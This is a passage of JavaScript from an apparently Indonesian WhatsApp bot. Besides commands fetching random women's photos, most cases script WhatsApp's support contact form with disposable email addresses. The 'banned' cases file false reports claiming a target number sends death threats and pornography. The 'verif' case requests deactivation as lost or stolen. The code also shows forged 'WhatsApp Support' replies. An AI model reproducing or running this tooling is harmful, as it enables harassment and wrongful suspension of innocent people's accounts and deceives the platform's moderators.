		case 'thunder':
			if (args.length == 0) return replywalu(`Example: ${prefix + command} Vinz X7`)
			if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
			vinz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${args}` } })
			break
			case 'cecanindo': {
			if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan indo`)
result = anu[Math.floor(Math.random() * anu.length)]
vinz.sendMessage(m.chat, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanjepan': case 'cecanjepang': {
if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan jepang`)
result = anu[Math.floor(Math.random() * anu.length)]
vinz.sendMessage(m.chat, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanmalaysia': case 'cecanmalaysia': {
if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan malaysia`)
result = anu[Math.floor(Math.random() * anu.length)]
vinz.sendMessage(m.chat, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanhijaber': {
if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan hijaber`)
result = anu[Math.floor(Math.random() * anu.length)]
vinz.sendMessage(m.chat, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanchina': {
if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan china`)
result = anu[Math.floor(Math.random() * anu.length)]
vinz.sendMessage(m.chat, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecanvietnam': {
if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan vietnam`)
result = anu[Math.floor(Math.random() * anu.length)]
vinz.sendMessage(m.chat, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecankorea': {
if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan korea`)
result = anu[Math.floor(Math.random() * anu.length)]
vinz.sendMessage(m.chat, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'cecan': {
if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan`)
result = anu[Math.floor(Math.random() * anu.length)]
vinz.sendMessage(m.chat, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
			case 'banned': 
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === isOwner) return reply(`Kontollll!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `The WhatsApp user number listed has used a modified WhatsApp and also the user has sent text containing threats and images containing pornography or sex. Number : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Silahkan Tunggu 1-24 jam untuk proses banned dan tunggu beberapa menit untuk balasan dari whatsapp`)
await sleep(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
break
			case 'bannedv1': 
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === isOwner) return reply(`Anjing!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `يستخدم رقم مستخدم واتساب المدرج رقم واتساب الذي تم تغييره ويقوم المستخدم أيضًا بإرسال نصوص تحتوي على تهديدات بالقتل وصور تحتوي على عناصر إباحية +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Silahkan Tunggu 1-24 jam untuk proses banned dan tunggu beberapa menit untuk balasan dari whatsapp`)
await sleep(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
break
case 'unbanned': {
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === isOwner) return reply(`Kontoll`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Почему мой номер заблокирован? Пожалуйста, повторно активируйте мой номер, так как я не нарушаю Условия использования WhatsApp. Пожалуйста, активируйте мой номер как можно скорее.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Vinz X7😁`)
await sleep(9000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'verif': 
{
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
   var axioss = require ("axios")
   let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
 let cookie = ntah.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
 let $ = cheerio.load(ntah.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
 form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "ID")
 form.append("phone_number", dtext)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
 form.append("your_message", "Perdido/roubado: desative minha conta")
 form.append("__user", "0")
 form.append("__a", "1")
 form.append("__csr", "")
 form.append("__req", "8")
 form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
 form.append("dpr", "1")
 form.append("__ccg", "UNKNOWN")
 form.append("__rev", "1006630858")
 form.append("__comment_req", "0")
 let res = await axioss({
   url,
   method: "POST",
   data: form,
   headers: {
     cookie
   }
 })
 vinz.sendMessage(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
 }
break

case 'unbanned4': case 'unban4': {
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aloha WhatsApp, ua ʻaihue ʻia kaʻu helu e ka mea hacker, e ʻoluʻolu e wehe hou iā ia [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Vinz X7😁`)
await loading(9000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanned': case 'unban': {
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hallo WhatsApp Meine WhatsApp-Nummer wurde ohne Grund gesperrt. Bitte reaktivieren Sie meine WhatsApp-Nummer, da diese Nummer viele meiner persönlichen Daten enthält, die ich unter dieser Nummer speichere, und ich diese Nummer auch für meine Büroarbeiten verwende, was sehr wichtig ist. Bitte reaktivieren Sie meine WhatsApp-Nummer so schnell wie möglich. Danke. mon numéro whatsapp : +[${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Vinz X7😁`)
await loading(9000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanned1': case 'unban1': {
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `bonjour WhatsApp. Pourquoi mon numéro est-il subitement bloqué ? Veuillez réactiver mon numéro dès que possible car le numéro est utilisé pour mon entreprise et je n'ai jamais enfreint les politiques de Whatsapp.
Mon numéro : +[${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Vinz X7😁`)
await loading(9000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanned2': case 'unban2': {
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Halo selamat pagi whatsapp saya adalah salah satu pengguna whatsapp dengan nomor berikut +[${targetnya}] saya mengalami masalah tentang nomor whatsapp saya yang diblokir. Saat saya membuka aplikasi whatsapp saya mendapatkan notifikasi yang berisikan bahwa "Akun ini tidak dapat menggunakan aplikasi WhatsApp" sebelumnya saya hanya melalukan pengiriman pesan chat kepada keluarga saya saat saya sedang bekerja. dan saya tidak merasa melakukan pelanggaran apapun yang bertentangan dengan ketentuan layanan whatsapp. Dengan permohonan maaf saya menjadi salah satu pertimbangan untuk mengaktifkan kembali akun whatsapp yang diblokir. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Vinz X7😁`)
await loading(9000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

